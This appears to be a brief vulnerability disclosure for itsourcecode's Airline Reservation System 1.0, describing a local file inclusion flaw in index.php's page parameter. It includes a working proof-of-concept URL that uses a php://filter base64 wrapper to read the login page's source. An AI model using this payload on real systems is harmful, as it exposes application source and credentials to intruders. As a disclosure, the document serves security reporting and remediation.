# Vendor

itsourcecode

# Product

Airline Reservation System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/03/Airline-Reservation-System-PHP-Project-Source-Code.zip

# Description

In the site's index.php page, due to insufficient filtering of the page parameter, an attacker can construct a special POC to achieve local file inclusion.
<img width="1307" alt="image" src="https://github.com/user-attachments/assets/871c0497-0006-4dfa-829a-a9dad68d3685">

# Poc

```
http://192.168.17.22/index.php?page=php://filter/convert.base64-encode/resource=login
```
